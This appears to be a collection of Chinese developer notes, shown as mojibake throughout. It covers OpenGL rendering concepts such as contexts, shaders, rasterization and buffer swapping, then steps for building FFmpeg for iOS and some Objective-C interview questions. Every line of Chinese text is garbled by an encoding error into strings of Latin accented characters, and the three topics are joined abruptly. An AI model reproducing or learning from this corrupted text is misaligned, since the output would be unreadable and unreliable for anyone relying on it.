ç”±äºOpenGLä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªå·¨å¤§çš„çŠ¶æ€æœºï¼Œåˆ‡æ¢ä¸Šä¸‹æ–‡å¾€å¾€ä¼šäº§ç”Ÿè¾ƒå¤§çš„å¼€é”€ã€‚ä½†æ˜¯ä¸åŒçš„ç»˜åˆ¶æ¨¡å—ï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨å®Œå…¨ç‹¬ç«‹çš„çŠ¶æ€ç®¡ç†ã€‚å› æ­¤ï¼Œå¯ä»¥åœ¨åº”ç”¨ç¨‹åºä¸­åˆ†åˆ«åˆ›å»ºå¤šä¸ªä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œåœ¨ä¸åŒçš„çº¿ç¨‹ä¸­ä½¿ç”¨ä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œä¸Šä¸‹æ–‡ä¹‹é—´å…±äº«çº¹ç†ã€ç¼“å†²åŒºç­‰èµ„æºã€‚è¿™æ ·çš„æ–¹æ¡ˆï¼Œä¼šæ¯”åå¤åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Œæˆ–è€…å¤§é‡ä¿®æ”¹æ¸²æŸ“çŠ¶æ€ï¼Œæ›´åŠ åˆç†é«˜æ•ˆçš„ã€‚

2ã€OpenGLçŠ¶æ€æœº

çŠ¶æ€æœºç†è®ºä¸Šæ˜¯ä¸€ç§æœºå™¨ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥è¿™æ ·å»ç†è§£ï¼ŒçŠ¶æ€æœºæè¿°äº†ä¸€ä¸ªå¯¹è±¡åœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­æ‰€ç»å†çš„å„ç§çŠ¶æ€ï¼ŒçŠ¶æ€ä¹‹é—´çš„è½¬å˜ï¼Œå‘ç”Ÿè½¬å˜çš„åŠ¨å› ï¼Œæ¡ä»¶ä»¥åŠè½¬å˜ä¸­æ‰€æ‰§è¡Œçš„æ´»åŠ¨ã€‚è¿™ä¸€ç‚¹ä¸Šæ¥è¯´ï¼Œè·ŸJSContextä¹Ÿå¯ä»¥ç±»æ¯”ä¸€ä¸‹ã€‚æˆ‘ä»¬çš„ä»»ä½•è¡Œä¸ºéƒ½æ˜¯ä¾èµ–ç€çŠ¶æ€æœºçš„ï¼ŒçŠ¶æ€æœºä¼šè®°å½•æ‰€æœ‰çš„è¡Œä¸ºï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨éœ€è¦ä½¿ç”¨æŸä¸€ä¸ªè¡Œä¸ºçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡çŠ¶æ€æœºå»æ‹¿å‡ºæ¥æŸä¸€ä¸ªè¡Œä¸ºã€‚æ‰€ä»¥çŠ¶æ€æœºä¹Ÿæ˜¯ä¸€ç§è¡Œä¸ºï¼Œè¯´æ˜å¯¹è±¡åœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­ç›¸åº”äº‹ä»¶æ‰€ç»å†çš„çŠ¶æ€åºåˆ—ä»¥åŠå¯¹é‚£äº›çŠ¶æ€äº‹ä»¶çš„ç›¸åº”ã€‚


å› æ­¤å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š


æœ‰è®°å¿†åŠŸèƒ½ï¼Œèƒ½è®°ä½å…¶å½“å‰çš„çŠ¶æ€

å¯ä»¥æ¥å—è¾“å…¥ï¼Œæ ¹æ®è¾“å…¥çš„å†…å®¹å’Œè‡ªå·±çš„åŸå…ˆçŠ¶æ€ï¼Œä¿®æ”¹è‡ªå·±å½“å‰çŠ¶æ€ï¼Œå¹¶ä¸”å¯ä»¥æœ‰å¯¹åº”è¾“å‡º

å½“è¿›å…¥ç‰¹æ®ŠçŠ¶æ€ï¼ˆåœæœºçŠ¶æ€ï¼‰çš„æ—¶å€™ï¼Œä¾¿ä¸å†æ¥æ”¶è¾“å…¥ï¼Œåœæ­¢å·¥ä½œã€‚

3ã€æ¸²æŸ“ï¼ˆRenderingï¼‰

è¿™ä¸ªå¥½ç†è§£ï¼Œå°±æ˜¯å°†å›¾å½¢/å›¾åƒæ•°æ®è½¬æ¢æˆ3Dç©ºé—´å›¾åƒæ“ä½œå«åšæ¸²æŸ“ã€‚ä¾‹å¦‚ï¼Œåœ¨å›¾ç‰‡æˆ–è€…è§†é¢‘è¿›è¡Œè§£ç ä¹‹åï¼Œå½¢æˆäº†ä¸€å¤§å †çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å°†è¿™ä¸€å †çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¾ç¤ºåˆ°å±å¹•ä¸Šé¢çš„è¿‡ç¨‹å°±å¯ä»¥ç†è§£ä¸ºæ¸²æŸ“ã€‚


4ã€é¡¶ç‚¹æ•°ç»„ï¼ˆVertexArrayï¼‰

é‚£ä¹ˆä»€ä¹ˆæ˜¯é¡¶ç‚¹å‘¢ï¼Ÿé¡¶ç‚¹å°±æ˜¯æŒ‡æˆ‘ä»¬å†ç»˜åˆ¶ä¸€ä¸ªå›¾å½¢çš„æ—¶å€™ï¼Œä»–çš„é¡¶ç‚¹çš„ä½ç½®æ•°æ®ï¼Œè¿™ä¸ªæ•°æ®æ˜¯å¯ä»¥ç›´æ¥å­˜å‚¨åœ¨æ•°ç»„ä¸­æˆ–è€…å°†å…¶ç¼“å­˜åœ¨GPUå†…å­˜ä¸­çš„ã€‚å¦‚æœå­˜å‚¨åœ¨æ•°ç»„ä¸­å°±æ„æˆäº†é¡¶ç‚¹æ•°ç»„ã€‚å…¶å®é¡¶ç‚¹æ•°æ®å°±æ˜¯æˆ‘ä»¬åœ¨ç”»ç”»çš„æ—¶å€™ï¼Œæœ€å¼€å§‹ç”»çš„ä¸€ä¸ªå¤§è‡´çš„éª¨æ¶ã€‚åœ¨OpenGLä¸­çš„å›¾åƒéƒ½æ˜¯ç”±å›¾å…ƒç»„æˆã€‚åœ¨OpenGL ESä¸­ï¼Œæœ‰ä¸‰ç§å›¾å…ƒï¼šç‚¹ã€çº¿ã€ä¸‰è§’å½¢ã€‚æˆ‘ä»¬é€šè¿‡è®¾å®šå‡½æ•°çš„æŒ‡é’ˆï¼Œå°†é¡¶ç‚¹æ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œç„¶åéœ€è¦ç»˜åˆ¶çš„æ—¶å€™ï¼Œç›´æ¥ä»å†…å­˜ä¸­å–å‡ºæ¥ä½¿ç”¨ã€‚è¿™ä¸€éƒ¨åˆ†çš„æ•°æ®å…¶å®å°±æ˜¯é¡¶ç‚¹æ•°ç»„ã€‚


5ã€é¡¶ç‚¹ç¼“å†²åŒºï¼ˆVertexBufferï¼‰

æˆ‘ä»¬ä¸Šé¢è¯´äº†ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨ç»˜åˆ¶æ–¹æ³•çš„æ—¶å€™ï¼Œç›´æ¥å°±ç”±å†…å­˜ä¼ å…¥é¡¶ç‚¹æ•°æ®ã€‚è¿˜æœ‰ä¸€ç§æ›´åŠ é«˜æ€§èƒ½çš„æ–¹æ³•ï¼Œå°±æ˜¯æå‰åˆ†é…ä¸€å¿«å†…å­˜ï¼Œå°†é¡¶ç‚¹æ•°æ®é¢„å…ˆä¼ å…¥åˆ°æ˜¾å­˜å½“ä¸­ï¼Œè¿™éƒ¨åˆ†çš„æ˜¾å­˜ï¼Œå°±å«åšé¡¶ç‚¹ç¼“å†²åŒºã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€å—ç©ºé—´ä¸å†å†…å­˜ä¸­ï¼Œè€Œæ˜¯åœ¨æ˜¾å­˜çš„ä¸€å—ç©ºé—´ä¸­ã€‚


6ã€ç®¡çº¿

å› ä¸ºæˆ‘ä»¬çš„GPUåœ¨å¤„ç†æ•°æ®çš„æ—¶å€™ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªå›ºå®šçš„é¡ºåºæ¥çš„ï¼Œè¿™ä¸ªé¡ºåºä¸èƒ½è¢«æ‰“ç ´ã€‚ç±»ä¼¼ä¸€ä¸ªæµæ°´çº¿çš„å½¢å¼ï¼Œæ‰€ä»¥è¢«ç§°ä¹‹ä¸ºç®¡çº¿ã€‚


7ã€å›ºå®šç®¡çº¿/å­˜å‚¨ç€è‰²å™¨

åœ¨æ—©æœŸçš„OpenGLç‰ˆæœ¬ï¼Œå®ƒå°è£…äº†å¾ˆå¤šç€è‰²å™¨ç¨‹åºå—å†…ç½®çš„ä¸€æ®µåŒ…å«äº†å…‰ç…§ã€åæ ‡å˜æ¢ã€è£å‰ªç­‰ç­‰è¯¸å¤šåŠŸèƒ½çš„å›ºå®šshaderç¨‹åºæ¥å®Œæˆï¼Œæ¥å¸®åŠ©å¼€å‘è€…æ¥å®Œæˆå›¾å½¢çš„æ¸²æŸ“ã€‚è€Œå¼€å‘è€…åªéœ€è¦ä¼ å…¥ç›¸åº”çš„å‚æ•°ï¼Œå°±èƒ½å¿«é€Ÿå®Œæˆå›¾å½¢çš„æ¸²æŸ“ï¼Œç±»ä¼¼äºiOSå¼€å‘ä¼šå°è£…å¾ˆå¤šçš„APIã€‚è€Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨ï¼Œå°±å¯ä»¥å®ç°åŠŸèƒ½ï¼Œä¸éœ€è¦å…³æ³¨åº•å±‚å®ç°åŸç†

ä½†æ˜¯çŠ¹è±«OpenGLçš„ä½¿ç”¨åœºæ™¯éå¸¸ä¸°å¯Œï¼Œå›ºå®šç®¡çº¿æˆ–å­˜å‚¨ç€è‰²å™¨æ— æ³•å®Œæˆæ¯ä¸€ä¸ªä¸šåŠ¡ï¼Œè¿™æ˜¯å°†ç›¸å…³éƒ¨åˆ†å¼€æ”¾æˆå¯ç¼–ç¨‹ã€‚

8ã€ç€è‰²å™¨ç¨‹åºShader

å°±å…¨é¢çš„å°†å›ºå®šæ¸²æŸ“ç®¡çº¿æ¶æ„å˜ä¸ºäº†å¯ç¼–ç¨‹æ¸²æŸ“ç®¡çº¿ã€‚å› æ­¤ï¼ŒOpenGLåœ¨å®é™…è°ƒâ½¤ç»˜åˆ¶å‡½æ•°ä¹‹å‰ï¼Œè¿˜éœ€è¦æŒ‡å®šä¸€ä¸ªç”±shaderç¼–è¯‘æˆçš„ç€è‰²ï¨¸ç¨‹åºã€‚å¸¸è§çš„ç€è‰²ï¨¸ä¸»è¦æœ‰é¡¶ç‚¹ç€â¾Šï¨¸(VertexShader)ï¼Œâ½šæ®µç€â¾Šï¨¸ (FragmentShader)/åƒç´ ç€â¾Šï¨¸(PixelShader)/ç‰‡å…ƒç€è‰²å™¨ï¼Œâ¼ä½•ç€â¾Šï¨¸ (GeometryShader)ï¼Œæ›²â¾¯ç»†åˆ†ç€â¾Šï¨¸(TessellationShader)ã€‚â½šæ®µç€â¾Šï¨¸å’Œåƒç´ ç€â¾Šï¨¸åªæ˜¯åœ¨OpenGLå’ŒDXä¸­çš„ï¥§åŒå«æ³•â½½è€Œå·²ã€‚å¯æƒœçš„æ˜¯ï¼Œç›´åˆ° OpenGLES 3.0ï¼Œä¾ç„¶åªæ”¯æŒäº†é¡¶ç‚¹ç€â¾Šï¨¸å’Œç‰‡æ®µç€â¾Šï¨¸è¿™ä¸¤ä¸ªæœ€åŸºç¡€çš„ç€â¾Šï¨¸ã€‚

OpenGLåœ¨å¤„ç†shaderæ—¶ï¼Œå’Œå…¶ä»–ç¼–è¯‘å™¨ä¸€æ ·ã€‚é€šè¿‡ç¼–è¯‘ã€é“¾æ¥ç­‰æ­¥éª¤ï¼Œâ½£æˆï¦ºç€â¾Šï¨¸ç¨‹åº(glProgram)ï¼Œç€â¾Šï¨¸ç¨‹åºåŒæ—¶åŒ…å«ï¦ºé¡¶ç‚¹ç€â¾Šï¨¸å’Œâ½šæ®µç€â¾Šï¨¸çš„è¿ç®—é€»è¾‘ã€‚åœ¨OpenGLè¿›ï¨ˆç»˜åˆ¶çš„æ—¶å€™ï¼Œâ¾¸å…ˆç”±é¡¶ç‚¹ç€â¾Šï¨¸å¯¹ä¼ â¼Šçš„é¡¶ç‚¹æ•°æ®è¿›ï¨ˆè¿ç®—ã€‚å†é€šè¿‡å›¾å…ƒè£…é…ï¼Œå°†é¡¶ç‚¹è½¬æ¢ä¸ºå›¾å…ƒã€‚ç„¶åè¿›ï¨ˆå…‰æ …åŒ–ï¼Œå°†å›¾å…ƒè¿™ç§çŸ¢ï¥¾å›¾å½¢ï¼Œè½¬æ¢ä¸ºæ …æ ¼åŒ–æ•°æ®ã€‚æœ€åï¼Œå°†æ …æ ¼åŒ–æ•°æ®ä¼ å…¥â½šæ®µç€â¾Šï¨¸ä¸­è¿›ï¨ˆè¿ç®—ã€‚â½šæ®µç€â¾Šï¨¸ä¼šå¯¹æ …æ ¼åŒ–æ•°æ®ä¸­çš„æ¯ä¸€ä¸ªåƒç´ è¿›ï¨ˆè¿ç®—ï¼Œå¹¶å†³å®šåƒç´ çš„é¢œâ¾Šã€‚

9ã€é¡¶ç‚¹ç€è‰²å™¨VertexShader

ä¸€èˆ¬ç”¨æ¥å¤„ç†å›¾å½¢æ¯ä¸ªé¡¶ç‚¹å˜æ¢[æ—‹è½¬/å¹³ç§»/æŠ•å½±ç­‰]

é¡¶ç‚¹ç€è‰²å™¨æ˜¯OpenGLä¸­ç”¨äºè®¡ç®—é¡¶ç‚¹å±æ€§çš„ç¨‹åºã€‚é¡¶ç‚¹ç€è‰²å™¨æ˜¯é€ä¸ªé¡¶ç‚¹è¿ç®—çš„ç¨‹åºï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªé¡¶ç‚¹æ•°æ®éƒ½ä¼šæ‰§è¡Œä¸€æ¬¡é¡¶ç‚¹ç€è‰²å™¨ï¼Œå½“ç„¶è¿™æ˜¯å¹¶è¡Œçš„ï¼Œå¹¶ä¸”é¡¶ç‚¹ç€è‰²å™¨è¿ç®—è¿‡ç¨‹ä¸­æ— æ³•è®¿é—®å…¶ä»–é¡¶ç‚¹çš„æ•°æ®

ä¸€èˆ¬æ¥è¯´å…¸å‹çš„éœ€è¦è®¡ç®—çš„é¡¶ç‚¹å±æ€§åŒ…æ‹¬é¡¶ç‚¹åæ ‡å˜æ¢ã€é€ä¸ªé¡¶ç‚¹å…‰ç…§è¿ç®—ç­‰ç­‰ã€‚é¡¶ç‚¹åæ ‡ç”±è‡ªèº«åæ ‡ç³»è½¬æ¢åˆ°å½’ä¸€åŒ–åšæ ‡è®°çš„è¿ç®—ï¼Œå°±æ˜¯åœ¨è¿™é‡Œå‘ç”Ÿçš„ã€‚

10ã€ç‰‡å…ƒç€è‰²å™¨ FragmentShader

ä¸€èˆ¬ç”¨æ¥å¤„ç†å›¾å½¢ä¸­æ¯ä¸ªåƒç´ ç‚¹é¢œè‰²è®¡ç®—å’Œå¡«å……

ç‰‡æ®µç€è‰²å™¨æ˜¯OpenGLä¸­ç”¨äºè®¡ç®—ç‰‡æ®µï¼ˆåƒç´ ï¼‰é¢œè‰²çš„ç¨‹åºã€‚ç‰‡æ®µç€è‰²å™¨æ˜¯é€ä¸ªåƒç´ è¿ç®—çš„ç¨‹åºï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªåƒç´ éƒ½ä¼šæ‰§è¡Œä¸€æ¬¡ç‰‡æ®µç€è‰²å™¨ï¼Œå½“ç„¶ä¹Ÿæ˜¯å¹¶è¡Œçš„ã€‚

11ã€GLSLï¼ˆOpenGL Shading language)

OpenGLç€è‰²è¯­è¨€ï¼ˆOpenGL Shading language)æ˜¯ç”¨æ¥åœ¨OpenGlä¸­ç€è‰²ç¼–ç¨‹çš„è¯­è¨€ï¼Œç±»ä¼¼äºCè¯­è¨€ã€‚ä»–ä»¬æ˜¯åœ¨å›¾å½¢å¡çš„GPUï¼ˆGraphic Proccessor Unitå›¾å½¢å¤„ç†å•å…ƒï¼‰ä¸Šæ‰§è¡Œçš„ã€‚ä»£æ›¿äº†å›ºå®šçš„æ¸²æŸ“ç®¡çº¿çš„ä¸€éƒ¨åˆ†ï¼Œä½¿æ¸²æŸ“ç®¡çº¿ä¸­ä¸åŒå±‚æ¬¡å…·æœ‰å¯ç¼–ç¨‹æ€§ã€‚æ¯”å¦‚ï¼šè§†å›¾è½¬æ¢ã€æŠ•å½±è½¬æ¢ç­‰ã€‚GLSLçš„ç€è‰²å™¨ä»£ç åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼šé¡¶ç‚¹ç€è‰²å™¨å’Œç‰‡æ®µç€è‰²å™¨

12ã€å…‰æ …åŒ–Rasterization

æ˜¯æŠŠé¡¶ç‚¹æ•°æ®è½¬æ¢æˆç‰‡å…ƒçš„è¿‡ç¨‹ï¼Œå…·æœ‰å°†å›¾è½¬åŒ–æˆä¸ºä¸€ä¸ªä¸ªæ …æ ¼ç»„æˆçš„å›¾åƒçš„ä½œç”¨ã€‚ç‰¹ç‚¹æ˜¯æ¯ä¸ªå…ƒç´ å¯¹åº”å¸§ç¼“å†²åŒºä¸­çš„ä¸€ä¸ªåƒç´ ã€‚

å…‰æ …åŒ–å°±æ˜¯æŠŠé¡¶ç‚¹æ•°æ®è½¬æ¢ä¸ºç‰‡å…ƒçš„è¿‡ç¨‹ã€‚ç‰‡å…ƒä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ å¯¹åº”äºå¸§ç¼“å†²åŒºä¸­çš„ä¸€ä¸ªåƒç´ 

å…‰æ …åŒ–å…¶å®æ˜¯ä¸€ç§å°†å‡ ä½•å›¾å…ƒå˜ä¸ºäºŒç»´å›¾åƒçš„è¿‡ç¨‹ã€‚è¯¥è¿‡ç¨‹åŒ…å«äº†ä¸¤éƒ¨åˆ†çš„å·¥ä½œã€‚ç¬¬ä¸€éƒ¨åˆ†å·¥ä½œï¼šå†³å®šäº†çª—å£åæ ‡ä¸­å“ªäº›æ•´å‹æ ¼æ …åŒºåŸŸè¢«åŸºæœ¬å›¾å…ƒå ç”¨ã€‚ç¬¬äºŒéƒ¨åˆ†å·¥ä½œï¼šåˆ†é…ä¸€ä¸ªé¢œè‰²å€¼å’Œä¸€ä¸ªæ·±åº¦å€¼åˆ°å„ä¸ªåŒºåŸŸã€‚å…‰æ …åŒ–è¿‡ç¨‹äº§ç”Ÿçš„æ˜¯ç‰‡å…ƒã€‚

æŠŠç‰©ä½“çš„æ•°å­¦æè¿°ä»¥åŠä¸ç‰©ä½“ç›¸å…³çš„é¢œè‰²ä¿¡æ¯è½¬æ¢ä¸ºå±å¹•ä¸Šç”¨äºå¯¹åº”ä½ç½®çš„åƒç´ åŠâ½¤äºå¡«å……åƒç´ çš„é¢œè‰²ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºå…‰æ …åŒ–ï¼Œè¿™æ˜¯ä¸€ä¸ªå°†æ¨¡æ‹Ÿä¿¡å·è½¬åŒ–ä¸ºç¦»æ•£ä¿¡å·çš„è¿‡ç¨‹

13ã€çº¹ç†

çº¹ç†å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå›¾ç‰‡ï¼Œä¹Ÿå°±æ˜¯ä½å›¾ã€‚â¼¤å®¶åœ¨æ¸²æŸ“å›¾å½¢æ—¶éœ€è¦åœ¨å…¶ç¼–ç å¡«å……å›¾â½š,ä¸ºï¦ºä½¿å¾—åœºæ™¯æ›´åŠ é€¼çœŸ.â½½è¿™ï§©ä½¿â½¤çš„å›¾ç‰‡,å°±æ˜¯å¸¸è¯´çš„çº¹ç†.ä½†æ˜¯åœ¨OpenGL,æˆ‘ä»¬æ›´åŠ ä¹ æƒ¯å«çº¹ï§¤,â½½ï¥§æ˜¯å›¾ç‰‡ã€‚


14ã€æ··åˆï¼ˆBlendingï¼‰

åœ¨æµ‹è¯•é˜¶æ®µä¹‹åï¼Œå¦‚æœåƒç´ ä¾ç„¶æ²¡æœ‰è¢«å‰”é™¤ï¼Œé‚£ä¹ˆåƒç´ çš„é¢œè‰²å°†ä¼šå’Œå¸§ç¼“å†²åŒºä¸­é¢œè‰²é™„ç€ä¸Šçš„é¢œè‰²è¿›ï¨ˆæ··åˆï¼Œæ··åˆçš„ç®—æ³•å¯ä»¥é€šè¿‡OpenGLçš„å‡½æ•°è¿›ï¨ˆæŒ‡å®šã€‚ä½†æ˜¯OpenGLæä¾›çš„æ··åˆç®—æ³•æ˜¯æœ‰é™çš„ï¼Œå¦‚æœéœ€è¦ï¤åŠ å¤æ‚çš„æ··åˆ ç®—æ³•ï¼Œâ¼€èˆ¬å¯ä»¥é€šè¿‡åƒç´ ç€â¾Šï¨¸è¿›ï¨ˆå®ç°ï¼Œå½“ç„¶æ€§èƒ½ä¼šæ¯”åŸç”Ÿçš„æ··åˆç®—æ³•å·®ä¸€äº›ã€‚


15ã€å˜æ¢çŸ©é˜µ(Transformation)

ä¾‹å¦‚å›¾å½¢æƒ³å‘ç”Ÿå¹³ç§»,ç¼©æ”¾,æ—‹è½¬å˜æ¢ã€‚å°±éœ€è¦ä½¿ç”¨å˜æ¢çŸ©é˜µã€‚


16ã€æŠ•å½±çŸ©é˜µï¼ˆProjectionï¼‰

â½¤äºå°†3Dåæ ‡è½¬æ¢ä¸ºäºŒç»´å±å¹•åæ ‡,å®é™…çº¿æ¡ä¹Ÿå°†åœ¨äºŒç»´åæ ‡ä¸‹è¿›ï¨ˆç»˜åˆ¶ã€‚


17ã€æ¸²æŸ“ä¸Šå±/äº¤æ¢ç¼“å†²åŒº(SwapBuffer)

å½“æˆ‘ä»¬æƒ³æŠŠä¸€ä¸ªå›¾åƒæ¸²æŸ“åˆ°çª—å£çš„æ—¶å€™ï¼ŒGPUä¼šå¼€è¾Ÿä¸€ä¸ªæ¸²æŸ“ç¼“å†²åŒºã€‚ä½†æ˜¯æ¯ä¸€ä¸ªçª—å£åˆåªæœ‰ä¸€ä¸ªç¼“å†²åŒºï¼Œé‚£ä¹ˆå¦‚æœåœ¨ç»˜åˆ¶çš„è¿‡ç¨‹ä¸­å±å¹•è¿›è¡Œäº†åˆ·æ–°ï¼Œçª—å£æ˜¾ç¤ºçš„ç”»é¢å°±æœ‰å¯èƒ½ä¸å®Œæ•´ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¸¸è§„çš„OpenGLç¨‹åºè‡³å°‘éƒ½ä¼šæœ‰ä¸¤ä¸ªç¼“å†²åŒºã€‚æ˜¾ç¤ºåœ¨å±å¹•ä¸Šçš„ç§°ä¸ºå±å¹•ç¼“å†²åŒºï¼Œæ²¡æœ‰æ˜¾ç¤ºçš„ç§°ä¸ºç¦»å±ç¼“å†²åŒºï¼Œåœ¨ä¸€ä¸ªç¼“å†²åŒºæ¸²æŸ“å®Œæˆä¹‹åï¼Œé€šè¿‡å°†å±å¹•ç¼“å†²åŒºå’Œç¦»å±ç¼“å†²åŒºäº¤æ¢ï¼Œå®ç°å›¾åƒåœ¨å±å¹•ä¸Šçš„æ˜¾ç¤ºã€‚åœ¨iOSä¸­ç»å¸¸é‡åˆ°çš„ç¦»å±æ¸²æŸ“ï¼Œå…¶å®å°±æ˜¯åŒç¼“å†²åŒºçš„æœºåˆ¶å¼•èµ·çš„ã€‚å¦‚æœè¿™æ–¹é¢æœ‰ç–‘é—®çš„ï¼Œå¯ä»¥ç§»æ­¥iOS ä¿æŒç•Œé¢æµç•…çš„æŠ€å·§å»äº†è§£ã€‚
ä½¿ç”¨äº†åŒç¼“å†²åŒºå’Œå‚ç›´åŒæ­¥æŠ€æœ¯ä¹‹åï¼Œç”±äºæ€»æ˜¯è¦ç­‰å¾…ç¼“å†²åŒºäº¤æ¢ä¹‹åå†è¿›è¡Œä¸‹ä¸€å¸§çš„æ¸²æŸ“ï¼Œä½¿å¾—å¸§ç‡æ— æ³•å®Œå…¨è¾¾åˆ°ç¡¬ä»¶å…è®¸çš„æœ€é«˜æ°´å¹³ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº†ä¸‰ç¼“å†²åŒºæŠ€æœ¯ï¼Œåœ¨ç­‰å¾…å‚ç›´åŒæ­¥æ—¶ï¼Œæ¥å›äº¤æ›¿æ¸²æŸ“ä¸¤ä¸ªç¦»å±çš„ç¼“å†²åŒºï¼Œè€Œå‚ç›´åŒæ­¥å‘ç”Ÿæ—¶ï¼Œå±å¹•ç¼“å†²åŒºå’Œæœ€è¿‘æ¸²æŸ“å®Œæˆçš„ç¦»å±ç¼“å†²åŒºäº¤æ¢ï¼Œå®ç°å……åˆ†åˆ©ç”¨ç¡¬ä»¶æ€§èƒ½çš„ç›®çš„ã€‚

## FFmpeg
FFmpegæ˜¯ä¸€å¥—å¯ä»¥ç”¨æ¥è®°å½•ã€è½¬æ¢æ•°å­—éŸ³é¢‘ã€è§†é¢‘ï¼Œå¹¶èƒ½å°†å…¶è½¬åŒ–ä¸ºæµçš„å¼€æºè®¡ç®—æœºç¨‹åºã€‚
é‡‡ç”¨LGPLæˆ–GPLè®¸å¯è¯ã€‚å®ƒæä¾›äº†å½•åˆ¶ã€è½¬æ¢ä»¥åŠæµåŒ–éŸ³è§†é¢‘çš„å®Œæ•´è§£å†³æ–¹æ¡ˆï¼ŒåŒ…æ‹¬äº†é¢†å…ˆçš„éŸ³ã€è§†é¢‘ç¼–ç åº“libavcodecç­‰ã€‚
```
libavformatï¼šç”¨äºå„ç§éŸ³è§†é¢‘å°è£…æ ¼å¼çš„ç”Ÿæˆå’Œè§£æï¼›
libavcodecï¼š ç”¨äºå„ç§ç±»å‹å£°éŸ³ã€å›¾åƒç¼–è§£ç ï¼›
libavutilï¼š  åŒ…å«ä¸€äº›å…¬å…±çš„å·¥å…·å‡½æ•°ï¼›
libswscaleï¼š ç”¨äºè§†é¢‘åœºæ™¯æ¯”ä¾‹ç¼©æ”¾ã€è‰²å½©æ˜ å°„è½¬æ¢ï¼›
libpostprocï¼šç”¨äºåæœŸæ•ˆæœå¤„ç†ï¼›
ffmpegï¼š     è¯¥é¡¹ç›®æä¾›çš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ç”¨äºæ ¼å¼è½¬æ¢ã€è§£ç æˆ–ç”µè§†å¡å³æ—¶ç¼–ç ç­‰ï¼›
ffseverï¼š    ä¸€ä¸ª HTTP å¤šåª’ä½“å³æ—¶å¹¿æ’­ä¸²æµæœåŠ¡å™¨ï¼›
ffplayï¼š     æ˜¯ä¸€ä¸ªç®€å•çš„æ’­æ”¾å™¨ï¼Œä½¿ç”¨ffmpeg åº“è§£æå’Œè§£ç ï¼Œé€šè¿‡SDLæ˜¾ç¤ºï¼›
```

1. ä¸‹è½½ https://github.com/kewlbear/FFmpeg-iOS-build-script
2. cd è·¯å¾„ æ‰“å¼€ç»ˆç«¯ $  sh build-ffmpeg.sh
æ­¥éª¤2æ‰§è¡Œå®Œæˆåè¿è¡Œsh build-ffmpeg.sh lipoå°†.aæ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªï¼›
æ­¥éª¤3æ‰§è¡Œå®Œæˆå°†FFmpeg-iOSæ–‡ä»¶å¤¹æ‹–åˆ°ç›®æ ‡å·¥ç¨‹å¹¶æ·»åŠ libz.dylibã€libbz2.dylibã€libiconv.dylibä¸‰ä¸ªåº“ï¼Œxcode7 åŠä»¥ä¸Šåˆ™æ˜¯æ·»åŠ libz.tbdã€libbz2.tbdã€libiconv.tbdï¼Œ
å¹¶æ·»åŠ æ¡†æ¶VideoToolbox.frameworkï¼ˆæ­¤æ¡†æ¶æ˜¯ iOS8 æ–°å¢çš„ï¼Œç”¨äºç¡¬è§£ç ï¼‰

è®¾ç½®å¤´æ–‡ä»¶è·¯å¾„$(PROJECT_DIR)/$(PRODUCT_NAME)/FFmpeg-iOS/includeï¼š
OC å·¥ç¨‹åœ¨è°ƒç”¨çš„æ—¶å€™ç›´æ¥#include "avformat.h"ï¼›
swift å·¥ç¨‹åˆ›å»ºæ¡¥æ¥å¤´æ–‡ä»¶ï¼Œåœ¨å¤´æ–‡ä»¶å†…æ·»åŠ #import "avformat.h"

objc
0. é™æ€å˜é‡å’Œå…¨å±€å˜é‡åŒºåˆ«
ä½œç”¨åŸŸçš„åŒºåˆ«

1. æ—¥å¸¸ä½¿ç”¨çš„ä¿®é¥°å±æ€§çš„å…³é”®å­—éƒ½æœ‰å“ªäº›ï¼Ÿä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ
2. å±æ€§çš„å®è´¨æ˜¯ä»€ä¹ˆï¼Ÿ
3. æ·±æ‹·è´å’Œæµ…æ‹·è´ï¼Œ`NSString` ä¸ºä»€ä¹ˆè¦ç”¨ `copy` ä¿®é¥°ï¼Œæ¢æˆ `strong` ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ`NSMutableString` å¯ä»¥ç”¨ `copy` ä¿®é¥°å—ï¼Ÿä¼šæœ‰ä»€ä¹ˆé—®é¢˜å—ï¼Ÿ
ä½¿ç”¨ NSMutableString è‚¯å®šæ˜¯æƒ³ç”¨å­—ç¬¦ä¸²çš„å¯å˜è¿™ä¸ªå±æ€§ï¼Œä½†å¦‚æœä½ ç”¨ copy å»ä¿®é¥°ï¼Œé‚£ä¹ˆç”Ÿæˆçš„å°†ä¼šæ˜¯ä¸å¯å˜çš„ï¼Œå½“ä½ å»è°ƒç”¨å¯å˜æ–¹æ³•æ—¶ï¼Œç¨‹åºå°†ä¼šå´©æºƒï¼

4. è¯´ä¸€ä¸‹ `static` å…³é”®å­—
5. ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå¼•å‘å¾ªç¯å¼•ç”¨ï¼Ÿæ€ä¹ˆè§£å†³ï¼Ÿ
